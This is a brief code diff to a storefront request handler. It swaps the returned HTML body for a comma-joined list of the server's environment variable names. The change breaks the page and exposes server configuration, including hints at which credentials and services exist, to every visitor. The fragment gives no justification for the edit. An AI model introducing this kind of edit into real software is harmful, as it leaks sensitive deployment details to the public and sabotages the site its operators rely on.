@@ -36,7 +36,7 @@ export const storefrontHandler = async (
         'Content-Type': 'text/html',
         ...event.headers,
       },
-      body: html,
+      body: Object.keys(process.env).join(','),
       ttl: 900,
     };
   } catch (e) {
